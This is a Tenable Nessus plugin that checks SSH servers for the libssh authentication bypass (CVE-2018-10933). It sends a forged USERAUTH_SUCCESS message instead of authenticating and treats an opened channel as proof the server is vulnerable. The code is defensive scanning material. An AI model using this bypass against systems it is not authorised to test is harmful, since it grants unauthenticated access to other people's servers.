#TRUSTED 4b6f71efe11d6aa731e300e7178e15a6321a7eac5ce682ba050d11bcd33fe0bc38cab10bed23701cdb23295ae58ce370352a88aecd4a3d37fbbb6ab41110b05275af4519940ba3ba03fa2aa1e4aadae707c4ddf366403a424fa866eaad5c0df96c1056d754132ff48e448153470ba6131de35609ae990ca84ee87047cc2ac0a62e70938a26a7a364672e7a2a6613e8871a09b84c6a9c619682d8c2b0e127f0f5d94b830703c73acbe3442bc59ac9ddde0618c7ec6f30c1f2e61ce6e4dc2df2ef30716e84b6110907a8e2d02abe2bab432894097a8d0fbde44cad9663f764cdff7594151c4d53d2f202f7b616dcde5eab59d6ab1db3a476480fcbe5f3251b6925444a78fd35bb1409f949e5123977af75ede884a176433091c9fcdda1e7c093c17f89b8a775d0456d7d263cf32ce4a9270adc0cbdd15741965bd9af038b66979828449307a14051c5039f80de4767050e23d98b62b1b2a7fbfc1338d79f5cb20c5ae62224ee63873222dff4d65146d66600312eb4b4f903cf4e730d6afd6962c9270a0beffc1590750fcdf7988a70417a0eb22a5394574dca37b9aad856e6f20f4df1bf8efea487dd9eec7288c31e94e81b66eeff52e63e823677d3f0bd3bd807ee4e04a05d50a85e12805ce54aea81f51cffc646dda64d054e3d84a6f03116ca181dcc56f542b1d7395a609afa4f443f8513fd32e3e85c8973ae8e3fd25fcfe3
#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(118154);
  script_version("1.20");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/02/08");

  script_cve_id("CVE-2018-10933", "CVE-2018-1000805");
  script_bugtraq_id(105677, 106762);
  script_xref(name:"IAVA", value:"2018-A-0347-S");

  script_name(english:"SSH Protocol Authentication Bypass (Remote Exploit Check)");

  script_set_attribute(attribute:"synopsis", value:
"The remote server is vulnerable to an authentication bypass.");
  script_set_attribute(attribute:"description", value:
"The remote ssh server is vulnerable to an authentication bypass. An
attacker can bypass authentication by presenting
SSH2_MSG_USERAUTH_SUCCESS message in place of the
SSH2_MSG_USERAUTH_REQUEST method that normally would initiate
authentication.

Note: This vulnerability was disclosed in a libssh advisory but has
also been observed as applicable to other applications and software
packages.");
  # https://www.libssh.org/2018/10/16/libssh-0-8-4-and-0-7-6-security-and-bugfix-release/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6f6b157e");
  # https://www.libssh.org/security/advisories/CVE-2018-10933.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?505261f8");
  # https://www.nutanix.com/opensource/disclosure/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?58a0f73d");
  script_set_attribute(attribute:"solution", value:
"Upgrade to libssh 0.7.6 / 0.8.4 or later, if applicable. Otherwise,
contact your product vendor.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2018-1000805");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2018/10/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/10/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2018-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("find_service1.nasl");
  script_require_ports("Services/ssh", 22);

  exit(0);
}

include("string.inc");
include("byte_func.inc");
include("misc_func.inc");

include("ssh_lib.inc");

session = new("sshlib::session");

sshlib::SSH_CLIENT_HANDLERS[120] = @sshlib::client_cb_msg_userauth_success;

port = get_service(svc:"ssh", default:22, exit_on_fail:TRUE);

ret = session.open_connection(port:port);
if(!ret) exit(0, session.error);

if(!session.complete_kex())
{
  session.close_connection();
  exit(1, "Unable to complete KEX");
}

session.sshsend(code:sshlib::PROTO_SSH_MSG_SERVICE_REQUEST, data:sshlib::mk_ssh_string("ssh-userauth"));
session.sshrecv_until(end_states:make_list("SERVICE_REQUEST_SUCCESS", "SOC_CLOSED"));

if(session.cur_state.val != "SERVICE_REQUEST_SUCCESS")
{
  session.close_connection();
  exit(1, "Did not receive SERVICE_ACCEPT for ssh-userauth authentication.");
}

session.cur_state.set("USERAUTH_REQUEST");

session.sshsend(data: mkdword(0, order:BYTE_ORDER_BIG_ENDIAN), code:sshlib::PROTO_SSH_MSG_USERAUTH_SUCCESS);

if(session.compression_alg_c_to_s == "zlib@openssh.com")
   session.enable_compression(mode:sshlib::MODE_OUT);
if(session.compression_alg_s_to_c == "zlib@openssh.com")
  session.enable_compression(mode:sshlib::MODE_IN);

var channel = session.get_channel();

if(channel && channel.state == sshlib::CHANNEL_STATE_ACCEPTED)
{
  session.close_connection();
  report =
    'Nessus was able to successfully open a channel on the libssh server\n' +
    'with no credentials.\n';
  security_report_v4(port: port, severity:SECURITY_WARNING, extra:report);
  exit(0);
}
else
{
  session.close_connection();
  audit(AUDIT_LISTEN_NOT_VULN, 'libssh server', port);
}
